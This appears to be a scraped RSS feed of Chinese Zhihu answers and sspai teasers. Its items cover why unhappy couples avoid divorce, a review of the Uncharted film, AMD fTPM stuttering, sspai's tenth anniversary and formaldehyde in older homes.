[{"title":"面对结婚后一地鸡毛的生活，为什么有的人坚持不离婚？","date":"2022-03-14 05:11:49","description":"\n<p data-pid=\"Ys_XNKAX\"><b>因为很多男人的观念是：可以婚外找情人，但婚姻不能解体。</b></p>\n<p data-pid=\"J4uMk6q8\">在中国，结婚的原因有很多。可能是年龄大了，家人开始催；可能是想要孩子了；可能是朋友同事都结婚了；也可能是对方家境不错。</p>\n<p data-pid=\"TE7bn5SP\">总之，中国式的婚姻不仅仅是两个人走到一起，而是<b>两个家庭</b>，彼此社会地位、经济基础都相互扎根到对方的世界。</p>\n<p data-pid=\"YTvfrv1l\">BBC纪录片《中国式婚姻》中，一位外国记者记录下合肥的相亲现场，采访一位陪儿子相亲的妈妈。</p>\n<p data-pid=\"1EG8BZ-N\">记者：您儿子为什么找不到女朋友？</p>\n<p data-pid=\"ICNgwaCI\">大妈：因为他工作的地方都是男的。</p>\n<p data-pid=\"9UOgLGef\">记者：他准备好结婚了吗？</p>\n<p data-pid=\"C7A8u2W2\">大妈：准备好了，房子已经买了。</p>\n<p data-pid=\"84weoAHK\">这位外国记者很不解，<b>怎么买了房子就是准备好结婚了。</b></p>\n<p data-pid=\"JpEpQXsb\">后来，他想通了：在中国，结婚不是一种<b>选择</b>，而是一种义务。为了结婚，中国人去相亲，去上约会训练班，甚至去整容。</p>\n<p data-pid=\"DNIkWMkC\">有的婚姻，一开始就没多少爱，而是为了利益，为了面子，为了孩子的凑合。</p>\n<p data-pid=\"F2E1-4Mf\">等到厌倦的时候，早已经活在自己给自己编织的网中，难以走出去。</p>\n<p data-pid=\"sGobyHOE\">可人要是真这么理智，倒也好。偏偏一个人想要被关注、被理解、被爱本来就是最本能事情。</p>\n<p data-pid=\"g2MkmLdI\">大多数女人恪守中国的婚姻观，即使想要理解，想要被爱，她会向自己的丈夫提建议。</p>\n<p data-pid=\"o8u-KqWz\">可是社会为男人提供的婚姻和关系却是分开的。</p>\n<p data-pid=\"gDDrZluQ\">周冲曾在一篇文章中讲过一个故事：</p>\n<p data-pid=\"O4sxlp81\">她曾经问过一个50多岁的男人：“某长，你觉得离婚率高，是好事，还是坏事？”</p>\n<p data-pid=\"7OJ5F9El\">对方果断说：“当然是坏事。国家应该管一管……”</p>\n<p data-pid=\"RRy8dVBN\">周冲继续说：“那么，如果两个人在一起很痛苦，怎么办？”</p>\n<p data-pid=\"Ov_j1S_h\">对方说：“那就自己出去找一个情人。婚是不能离的。”</p>\n<p data-pid=\"td9G41ON\">你看，很多男人的观念是：<b>可以出轨找情人，但婚姻不能解体。</b></p>\n<p><br></p>\n<p data-pid=\"aZSAkeDx\"><b>01</b></p>\n<p data-pid=\"hFJ_fFXb\"><b>男人比女人更怕离婚</b></p>\n<p><br></p>\n<p data-pid=\"4b8I4qhD\">国外有一个调查：</p>\n<p data-pid=\"4fEzTWWo\"><b>男人在离婚后的生活质量大大降低</b>，放纵自己、饮食不规律、体重大增，有48%的男人声称自己感到异常孤独。</p>\n<p data-pid=\"DmD5iMFC\">相反，离婚后的<b>女人日子却越过越滋润</b>，感到自己孤独的女性百分比只占到总人数的28%。</p>\n<p data-pid=\"jSxl_AwP\">为什么呢？</p>\n<p data-pid=\"ArKU3BfP\">我们可以在这几年日本“<b>退休离婚</b>”的现象中找到答案。</p>\n<p data-pid=\"HpHNPvCI\">通常，日本女人做家务，带孩子，不仅要照顾自己和孩子，还要照顾这个男人。</p>\n<p data-pid=\"lWKLpk7J\">而日本男人一辈子都在工作，下班跟朋友聚会，也不回家，不做家务，更不用说经营感情。</p>\n<p data-pid=\"vomP-N9h\">而日本法律有一个这样的规定，妻子享有与丈夫平分退休金的权利。丈夫一旦退休，有了养老金的妻子们便不愿意再承受这样的委屈，纷纷提出离婚。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9f4ba1bd5844fb06953544f135f34731_720w.jpg?rss\" data-rawwidth=\"635\" data-rawheight=\"532\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-9f4ba1bd5844fb06953544f135f34731\" data-watermark-src=\"v2-578dc77dfae040e0514056fecf2ecc65\" data-private-watermark-src=\"v2-77bdab5260b17d2dae56fe662c1b454d\"></p>\n<p data-pid=\"xgdJd3HL\"> 男人习惯了衣来伸手饭来张口的生活，一直享受着婚姻所带来的好处却不自知，等到离婚之后，才发现，家里不再总是整洁，不再总有热菜。</p>\n<p data-pid=\"IMW_yf2j\"><b>于是，他们才看到那些一直被自己忽略的，却是自己大部分日常的存在。才因失去而倍感孤独。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0e41ca617afc45ab22d9909eb8a16be8_720w.jpg?rss\" data-rawwidth=\"527\" data-rawheight=\"324\" data-size=\"normal\" data-caption=\"（退休离婚后的日本男人，抑郁、自杀、犯罪率逐年上升）\" data-watermark=\"original\" data-original-src=\"v2-0e41ca617afc45ab22d9909eb8a16be8\" data-watermark-src=\"v2-e4a484d67c6744a8dd4be9982bd9073b\" data-private-watermark-src=\"v2-341a045c51ab39da7b0679f0eb094375\"></p>\n<p data-pid=\"Xqz3beHM\">很多女人会说：你要么离婚，要么好好过，给个痛快话。</p>\n<p data-pid=\"pdnQ3nlz\">可是，很多男人会说，<b>我不想离婚。</b></p>\n<p data-pid=\"Ie9iGIYw\">但他没说的下一句话其实是，<b>我也不想好好过。</b></p>\n<p data-pid=\"e7mFklH8\">为什么会这样呢？</p>\n<p data-pid=\"PzwPME69\">其实，在他们的眼里，<b>婚姻和关系是分开的</b>。</p>\n<p data-pid=\"J7xJqjyK\">不离婚，不等于要靠近。</p>\n<p data-pid=\"Sp0b03Uc\">不离婚，不等于要让你高兴。</p>\n<p data-pid=\"JdY2JUze\">不离婚，不等于要满足你的要求。</p>\n<p data-pid=\"XFbjXnmC\">当然，不离婚，也不等于要改善关系。</p>\n<p data-pid=\"fH2TOXPr\">你会发现，男人对婚姻的依赖，其实主要是在<b>生活方面</b>；而女人对婚姻的依赖，主要是<b>情感方面</b>。</p>\n<p data-pid=\"IsrmO92x\">但一个是生存威胁；一个是发展威胁。男人也自然比女人更不敢离婚。</p>\n<p><br></p>\n<p data-pid=\"ge3iChxp\"><b>02</b></p>\n<p data-pid=\"Ykkom7O0\"><b>“没意愿”和“没能力”的男人</b></p>\n<p data-pid=\"-ynUhACB\">对女人来说，“离婚”和“改善关系”就像是跷跷板的两端，不改善关系就意味着离婚，而不离婚就意味着改善关系。</p>\n<p data-pid=\"0CW_FWQR\">可为什么男人会把“不离婚”和“改善关系”分开呢？</p>\n<p data-pid=\"UptbelRa\">有两个原因：没意愿和没能力。</p>\n<p data-pid=\"iISPfdrY\"><b>先说没意愿。</b></p>\n<p data-pid=\"B6lLLNan\">比如说，一个男人出轨，那他是更爱老婆还是更爱情人呢，怎么判断呢？</p>\n<p data-pid=\"tudWGrDb\">老婆会觉得，我都这么痛苦了，他还要去见情人，他当然是更爱情人。</p>\n<p data-pid=\"xFSab1Pu\">情人会觉得，我都付出这么多，他要是真的爱我早就离婚了，他当然是更爱老婆。</p>\n<p data-pid=\"dbvA_-zt\">男人会觉得，一个人是能够同时爱很多人的呀，两个人我都爱。</p>\n<p data-pid=\"laVt83_H\">那他到底爱谁呢？</p>\n<p data-pid=\"CQIFUOdt\">很简单，<b>他爱的人只有自己</b>。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fd08f00031efd0fcccfcdf4b17da6c9a_720w.jpg?rss\" data-rawwidth=\"576\" data-rawheight=\"299\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-fd08f00031efd0fcccfcdf4b17da6c9a\" data-watermark-src=\"v2-34a002bd2bc1228e1733e9828f925a28\" data-private-watermark-src=\"v2-513923cd411f62e5a8793e504c48bc7f\"></p>\n<p data-pid=\"mLo3gCPt\">曾接待一位男性来访者，就特别困惑地问：<b>我就想不通，不就出个轨，她干嘛那么大脾气。古代男人不都三妻四妾嘛。</b></p>\n<p data-pid=\"9UnTBiXd\">心理学上有个词叫“<b>自恋</b>”，就是说自恋型的人比一般人更重视自己的需要，觉得自己特别重要，不现实地认为自己可以被特殊地优待。</p>\n<p data-pid=\"vVTL49uc\">而别人在他们的心中更像是一种满足自己的工具。</p>\n<p data-pid=\"QMBX9IZ7\"><b>再说没能力。0</b></p>\n<p data-pid=\"18gWd3B7\">有的男人会说这样的话：</p>\n<p data-pid=\"foDSGGr5\">“两个人不要整天腻在一起，大家都有自己的空间不好嘛。”</p>\n<p data-pid=\"IeeDVr8j\">“干嘛总是逼我承诺，我真的很烦她这样。”</p>\n<p data-pid=\"vuvc7y5P\">“不要老跟我说想你，爱你，你不觉得烦嘛。”</p>\n<p data-pid=\"wunWLrZN\">这类人就处在一种“<b>爱无能</b>”的状态，他们没能力跟别人有更深层次的情感交流，对于爱也就不知所措。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c7ad0926d34900c3ded22b2b7ff736e3_720w.jpg?rss\" data-rawwidth=\"640\" data-rawheight=\"533\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c7ad0926d34900c3ded22b2b7ff736e3\" data-watermark-src=\"v2-b19f88a53eac04e148170733a1f38493\" data-private-watermark-src=\"v2-071eaf0e04beafa18b216260e620ad05\"></p>\n<p data-pid=\"F2IFDWtL\"><b>心理学上的“情绪无能”就是在说这群人，他们可能总是彬彬有礼，温和善良。但一旦需要有情感上的交流，他们既不想知道你的感觉，也不想说自己的感觉。</b></p>\n<p data-pid=\"NvwAH3Jj\">因为在他们的体验中，感觉是可怕的，是可能摧毁他们的。</p>\n<p data-pid=\"jVc5lDUe\">一旦体会到失望、愤怒、痛苦等等的感受，他们的要么<b>否认</b>或者<b>忽视</b>；要么把这种感觉扔给别人。</p>\n<p data-pid=\"ux2ES-lD\">比如说：</p>\n<p data-pid=\"zllN1H4J\">孩子生病了，是你蠢。</p>\n<p data-pid=\"lwBBD6Y9\">家里没纸了，是你没用。</p>\n<p data-pid=\"A7TqYM4m\">地脏了，是你错了。</p>\n<p data-pid=\"0TM7X6N2\">天下雨了，我心情不好，都是你不好。</p>\n<p data-pid=\"spfFEcqq\"><b>被困在情绪无能中的家庭，就像是一滩死水，虽然存在，却已经死了。</b>而男人对于这样的状态却早已习惯，察觉不到有什么异样。</p>\n<p><br></p>\n<p data-pid=\"TaDC9rAO\"><b>03</b></p>\n<p data-pid=\"8w5JqsGX\"><b>你永远都有两种选择</b></p>\n<p><br></p>\n<p data-pid=\"GxIJGEO1\">很喜欢《离婚律师》中的一句话：</p>\n<p data-pid=\"XqrNgqzf\">没有什么是必须通过婚姻才能够得到的，但两个人之间最珍贵的感情，只有通过婚姻才可能产生。</p>\n<p data-pid=\"5BQe58gv\">如果你的老公没意愿也没能力改善关系，而你无法放弃这段婚姻，怎么办？</p>\n<p data-pid=\"_aqhqxfW\"><b>一定要有教别人爱自己的能力。</b></p>\n<p data-pid=\"mcbF-ZS-\">首先，你一定要记住，和男人打交道跟和女人打交道是不一样的，女人可以袒露脆弱，但一定要时刻维护你的自我价值和面子。</p>\n<p data-pid=\"Ts0qsZov\">第二，怎么教？我们要对态度的重视程度超过对内容的重视程度。</p>\n<p data-pid=\"XL580xjT\">比如稍微回复不及时，男方张口就骂。</p>\n<p data-pid=\"dw0DztC7\">此时，我们不需要解释，而需要<b>对他的态度进行纠正</b>：</p>\n<p data-pid=\"xcLcMrYk\">1）我能理解你对宝宝的担心。</p>\n<p data-pid=\"Fm6d2ngG\">2）但是你这种骂人的态度，我不接受。</p>\n<p data-pid=\"xIhNJyAw\">3）我不回复你，肯定有我的原因，这次是因为手机欠费，但你认为我不尊重你，你没有问清情况，就断定是后者，这样的交流，我不接受。</p>\n<p data-pid=\"bYvK_K58\">4）而且当你不尊重我的时候，我也很难尊重你。</p>\n<p data-pid=\"UX-V9Rqd\">5）我希望你对刚才说的话道歉。</p>\n<p data-pid=\"sVESdN19\">6）如果不道歉的话，我会用我的方式表达我对你态度的反击。</p>\n<p data-pid=\"m8sKiDjI\">这就是用成人的态度与之交流的方式。</p>\n<p data-pid=\"OZ3VLGBa\">很多人说，就算我这么说，他很有可能会大肆反击，或者置之不理。</p>\n<p data-pid=\"SIQB4Qqd\">其实他是否乖乖道歉不是最重要的，而是我们要<b>听其言观其行</b>。</p>\n<p data-pid=\"4MFPI_w-\"><b>如果他没有道歉，但此后言语开始注意了，开始尊重了，那么我们就给他个台阶下。</b></p>\n<p data-pid=\"3026XWS2\">但是如果他继续这种冒犯的言语，我们就要坚持最基本的底线，直到他认为这是一个墙壁，他这么犯浑下去，对自己没有任何好处。</p>\n<p data-pid=\"BPf4Tg5q\">说到这里，我想说的是，话术只是一种“术”，只是招数，但真正决定关系的，不是这些花拳绣腿，而是你的“<b>定力</b>”。</p>\n<p data-pid=\"qrWM22_R\">这就是我们的“内功”，我的话语再漂亮，如果你的力气太小，就自然对你毫无用处。</p>\n<p data-pid=\"QBTSxiLR\">为什么你能容忍他不离婚，还不好好对待你呢？</p>\n<p data-pid=\"sBcA1oz1\">因为你的内心被一个心魔所整蛊，那个心魔就是：如果我没有这个男人，我就活不下去的婴儿心态。</p>\n<p data-pid=\"DkA53Frn\">我们活在这个世界上，就是有三个选择：</p>\n<p data-pid=\"9WkRpd_g\">1）把照顾自己的责任交给别人。</p>\n<p data-pid=\"Ccx9Fq3T\">2）把照顾自己的责任交给自己。</p>\n<p data-pid=\"R0eV_4_a\">3）把照顾自己的责任交给自己和他人。</p>\n<p data-pid=\"_IFSQoz_\">前面两者都不太靠谱，因为前者太不安全，万一这个人没能力照顾你呢？后者也太自不量力，万一你没有能力照顾你呢？我们要学习的，是第三种。</p>\n<p data-pid=\"GZma3Xbb\"><b>首先，照顾自己的责任方，是你自己；</b></p>\n<p data-pid=\"n2hDQpoP\"><b>第二，你要学会一定的自我照顾的能力；</b></p>\n<p data-pid=\"JcgFtIVF\"><b>第三，你要学会教别人照顾自己的能力。</b></p>\n<p data-pid=\"fvOnyWvl\">学会这三点，你的人生才有真正的安全感。</p>\n<p data-pid=\"E6RDSWl5\">否则，一切都是扯淡。</p>\n<p data-pid=\"TjaKYWwA\"><b>如果你也有情感问题需要解决，可以按下图所示找我 </b><a class=\"member_mention\" href=\"http://www.zhihu.com/people/f0acd87dbdd58922b460cd0e9f13bebe\" data-hash=\"f0acd87dbdd58922b460cd0e9f13bebe\" data-hovercard=\"p$b$f0acd87dbdd58922b460cd0e9f13bebe\">@婚恋咨询师卢悦</a> <b>加个好友，说说遇到的实际困难，我来帮你分析解决。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-792b986c8808a42df1e41640aeadda9c_720w.jpg?rss\" data-rawwidth=\"295\" data-rawheight=\"256\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-792b986c8808a42df1e41640aeadda9c\" data-watermark-src=\"v2-78a2c5b360873f3ba7ca1f71314757a0\" data-private-watermark-src=\"v2-c35f1262c094bbc18af7049cbffd2d98\"></p>\n<p data-pid=\"v13nemwl\"><a class=\"member_mention\" href=\"http://www.zhihu.com/people/f0acd87dbdd58922b460cd0e9f13bebe\" data-hash=\"f0acd87dbdd58922b460cd0e9f13bebe\" data-hovercard=\"p$b$f0acd87dbdd58922b460cd0e9f13bebe\">@婚恋咨询师卢悦</a>， 知乎十年新知答主。70后，婚恋作者，央视、北京卫视、凤凰卫视多档栏目特约心理专家，心之助女性情感心理平台联合创始人。</p>\n<p data-pid=\"ciaaVSpx\">著有《爱情有毒》、《爱到绝处便逢生》、《过日子就像玩闯关游戏》、《亲密关系的重建》</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0aa78f172d315f4eea944566e6188e85_720w.jpeg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1365\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-0aa78f172d315f4eea944566e6188e85\" data-watermark-src=\"v2-b60161716b58cde31be719fbe7179b7f\" data-private-watermark-src=\"v2-2b73c30fa6bd9cf4c7a433a2f3a4d15d\"></p>\n<p data-pid=\"xmgM2zIb\">同时关注我往期高赞回答，有收获、有惊喜！</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/question/20375167/answer/435503936\" data-image=\"https://pic1.zhimg.com/v2-0b1657656a823cdccba094fcc3c5ea27_bh.jpg\" data-image-width=\"556\" data-image-height=\"424\" class=\"internal\">什么样的男人不能嫁？</a><a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/question/334497220/answer/751689060\" data-image=\"https://pic4.zhimg.com/v2-c001b7171d1067420871fd53332728b3_l.jpg\" data-image-width=\"400\" data-image-height=\"498\" class=\"internal\">婚姻里最可怕的是什么？</a><p data-pid=\"FQHx2aLi\"><br></p>\n<p><br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/lu-yue-46?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">婚恋咨询师卢悦</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/515143415/answer/2387531876?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">242 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/433844364?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">结婚是因为幸福，为什么最后只剩下一地鸡毛?</a><br><a href=\"http://www.zhihu.com/question/449955450?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">生活已经一地鸡毛，女人很想离婚，为什么男人却死活不同意离婚？</a><br>\n","link":"http://www.zhihu.com/question/515143415/answer/2387531876?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"荷兰弟的《神秘海域》拍得怎么样？值得去看吗？","date":"2022-03-14 04:20:16","description":"\n<p data-pid=\"79tnkMnT\">从入手游戏神秘海域4开始，我就打开了一个冒险寻找传说中海盗的宝藏，并揭露历史中隐藏的阴谋为主线的世界旅行。所以我对这部电影的期待值是很高的，但是又有担心，担心它成为下一个《孤胆义侠》2005，因为游戏基本上纯虚构的故事线，而电影在创作的基础上必须要有写实的感觉，让人有代入感寻求共情。所以游戏和电影的相结合不得不说，确实是很有难度，但神秘海域游戏做的逻辑性非常强，每一个剧情都是经得起推敲的，那游戏和电影之间就有了桥梁，也有了转变的基础从一部优秀的游戏转变为一部优秀的电影，荷兰弟在剧中的身材也是能看出了是花了时间锻炼过的，包括还原了很多在游戏中的攀爬，跳跃，跑酷等动作都是很让游戏玩家所惊喜的，剧中的美式幽默也隔三差五就冒出一句，在紧张的剧情线中穿插，使得观影者的观影体验总体都是轻松愉快的。虽然说看这种电影不能带着脑子看但是还是有不少bug的存在是不能细扣的，比如黄金到底有多重，在“飞船大战”上荷兰弟用黄金盾牌挡子弹，难免会让人有一些短暂的出戏，以及反派死于话多被割喉了却只有一道血线，不过这些问题都不大，毕竟是游戏改编，能还原一部分剧情以及优秀的画面我就已经很满足了，轻轻松松的不带脑子看这个电影也挺爽的不是嘛</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/42-51-89-74?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">三金的秋实</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/520724384/answer/2388347961?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">239 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/517109525?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">荷兰弟主演的《神秘海域》定档 3 月 14 日，身为游戏玩家的你会走进电影院去看吗？</a><br><a href=\"http://www.zhihu.com/question/520765294?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">荷兰弟的《神秘海域》和 DC《新蝙蝠侠》同期上映，谁能拿到更好的票房？</a><br>\n","link":"http://www.zhihu.com/question/520724384/answer/2388347961?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"让 AMD Yes 不起来的小模块：fTPM 性能问题的成因与解决","date":"2022-03-14 03:37:14","description":"如果你正在使用 AMD Ryzen 处理器的电脑，最近或多或少都可能遇到了系统间歇性卡顿的问题，比如：软件无故卡顿、音频间歇停顿等等一系列问题。不过，这并非是你或者 Windows 11 的问题，AMD 也于近期调查了卡顿的原因并发布了公告：「卡顿是由 Ryzen 处理器内置的固件可信平台模块（fTPM）引起的」。\n既然 TPM 是这次 Ryzen 处理器系统卡顿的罪魁祸首，那么为什么微软却极力要求 Windows 11 的硬件设备中必须有 TPM？它到底有多重要？以及我遇到了这个问题我能怎么办？<a href=\"https://sspai.com/post/72029\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/72029"},{"title":"派早报：少数派迎接十周岁生日；Google 宣布推动个人数据平台间迁移等","date":"2022-03-14 00:50:17","description":"你可能错过的新鲜事少数派迎接十周岁生日今天是少数派建站十周年纪念日。2012年，移动市场群雄逐鹿，异形产品天马行空；平台生态渐成规模，app经济方兴未艾；3D打印、4GLTE、无人驾驶等「未来科技」纷 ...<a href=\"https://sspai.com/post/72038\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/72038"},{"title":"住了很多年的老房子，甲醛还会超标吗？","date":"2022-03-13 07:19:17","description":"\n<p data-pid=\"4rBtdw4e\"><b>结论：住了多年的老房子是会存在甲醛超标的情况的，不过根据房子不同的情况来进行分析</b></p>\n<p data-pid=\"xx0BP4Em\">以下从几个部分进行分析</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b7e5ec152d414fa4917274fff537ffb6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1023\" data-rawheight=\"490\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"Z5xwxxZW\">大部分甲醛的产生都是由于新房在装修的时候产生的，从油漆工程的开始到地板、柜子、窗帘以及家具的安装让甲醛的含量达到一个高峰状态，家具中含胶的所有物品都是存在甲醛污染源的</p>\n<p data-pid=\"6gisj7BH\"><b>而老房子又产生甲醛的原因有哪些呢？</b></p>\n<p data-pid=\"_jzY4jLn\">首先是关于家具的添置，更换窗帘、添置新家具等关于家具的一系列更换，都会造成甲醛超标，比如：沙发、床、柜子、茶几、窗帘、桌子、椅子....这是很容易被忽略的一个地方，很多人可能完全没有想到，新的家具添置以后也不会刻意去通风，如果没有及时通风，在家具更换多的情况下，轻易就会导致甲醛超标，所以最好的方法是把家具先放置一段时间再放家里，或者是家具入场以后每天及时进行一段时间的通风，让空气流通。</p>\n<p data-pid=\"6PZPunOO\">再就是有些老房住久了子久了会进行局部的修缮，而在这些装修过程中，造成甲醛污染的有：更换壁纸、木地板、墙面粉刷、家具布艺的粘接剂、或者各种板材需要大量的粘合剂，而木材的构造不同，使用的粘合剂用量也不相同，用量的大小决定了甲醛的污染程度，所以，老房子的翻新也是会导致甲醛超标的一个点，不管是翻新的面积大不大，都要及时的进行通风。</p>\n<p data-pid=\"5615D1xu\"><b>壁纸更换</b>：更换壁纸的甲醛来源于需要用胶水把壁纸黏在墙上，甲醛来自于胶水，以及壁纸本身的价格就低廉，使用方便，有些商家会使用化纤纺织品获取更多的利润空间，导致再使用过程中释放出甲醛一些有害物质</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6fedabd292a24068c87d633bdbdbd376_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"858\" data-rawheight=\"479\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"EUuSCAH6\"><b>木地板：</b>木地板的甲醛来自于地板板材所使用到的胶水，比如复合地板，强化地板，这种地板是一定用了胶水的含甲醛的，而纯实木地板就比较环保，甲醛的释放量很少，缺点就是价格也比较贵</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a4a22ce197eef23623b6195708feec07_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"946\" data-rawheight=\"505\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"ievAtx0l\"><b>墙面粉刷</b>：墙面的粉刷会用到油漆、乳胶漆之类的，涂料粉刷里面都有一定的甲醛，就算是宣称环保涂料，也不能避免，刷白墙前也是需要用胶水进行调试的，还有需要用到的粘合剂，溶剂都是含有甲醛的</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4914d2a814c0c98958b187c54138e3cd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"581\" data-rawheight=\"408\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"4zVE2V1B\">还有一些布艺家具也是会含有甲醛的，比如说沙发这种大的家具，在工艺上也是会用到胶水的，不过有些布艺制品只有微量的甲醛，使用之前可以用请说浸泡清晰，或者是用湿抹布擦拭家具，还有用湿拖把拖地板，这样也是可以清除一部分甲醛的，但总体来说软体家具和实木家具并不必过于考虑甲醛危害。</p>\n<p data-pid=\"nlSc_HnC\">所以在面对老房子的翻新跟家具的添置，不进行晾房同样会甲醛超标，如果老房子已经居住在里面不便，可以选择白天的时候把窗户门都打开通风透气，晚上再关上。</p>\n<p data-pid=\"r1SJoM3H\">另外除了家具材料，还有墙面的列横、家居，特别是板式家居，封边破损都会导致甲醛污染从封闭的内部释放出来，再加上没有去及时通风，导致空气流通不畅以及夏季温度高甲醛容易释放，所以也容易导致甲醛超标，如果室内的温度越高，甲醛的释放就更高</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c5ee10d3f240243961eb6cd5bcaca26c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"743\" data-rawheight=\"447\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"MAxnvE9h\">甲醛的挥发周期是非常之久的，一般家具或者是刚开封的材料在3-5个月甲醛释放量会达到一个高峰期，在数年之后由开始的快速到缓慢的释放过程，但是板材中还是会继续存在着一定的甲醛含量，是封闭在内部的，等多年以后板材破损，就又自然挥发出来了</p>\n<p data-pid=\"yujwQQGM\">各类板式家具，比如地板、橱柜、衣柜或者一些专门做的定制的家具，只要是人造板材都需要注意，人造板的甲醛散发是影响最久的室内污染，尤其是密度地板，地板的用量是最大的，所以要更加注重</p>\n<p data-pid=\"-CHIR-IY\"><b>选择人造板材要注意的点：</b></p>\n<p data-pid=\"HVSLCoCm\"><b>①板材的好坏</b></p>\n<p data-pid=\"EWy9I5yu\">板材的好坏能决定板材的甲醛含量的高低，以及甲醛的释放年限，越差的板材甲醛的挥发就越久</p>\n<p data-pid=\"FH0wRSvU\">去年发布的板材甲醛释放标准，不止有E1级别，还有E0级别以及更高标准的ENF板材的释放限量值，购买板材可以要求商家出示板材甲醛的检测报告进行选择更为环保的产品</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-748785ffb8f48f7eb070604c8c31aef3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1266\" data-rawheight=\"479\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"gTxL4RYv\"><b>②板材的封边</b></p>\n<p data-pid=\"og8wOBcp\">严密的封边会把游离性甲醛封闭在内，如果没有选择好的封边，使用久了很容易导致封边破损，甲醛又会重新进行释放</p>\n<p data-pid=\"r4iTNrDh\">Ps：还有一些板材，封边技术过关，表面上都环保了，但是有些家具在使用的过程中会需要打孔或者是钻眼，也会破坏板材，导致甲醛的释放，所以从根源上选择环保一点的板材才是最好的选择</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ea3022a26008707d238d16aafa940c5b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"533\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"WN7ejirt\">如果是选择的纯实木的家具，相对来说，环保度更高，用胶量也比人造板材相对较少些</p>\n<p data-pid=\"3k7epbMV\">最后就是以前使用的家具建材，刚开始装修时使用了劣质的涂料油漆、壁纸乳胶，而劣质产品甲醛含量更高，挥发时间更为长久，所以是即使是多年，也会导致老房子甲醛超标，而且根据《2020国民家居环保报告》显示：房间装修完成5年内甲醛超标率仍高于15%，所以家具建材的选择也是尤为重要的</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-155d7116c185f6822ad351d19dd3e528_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"481\" data-rawheight=\"289\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p 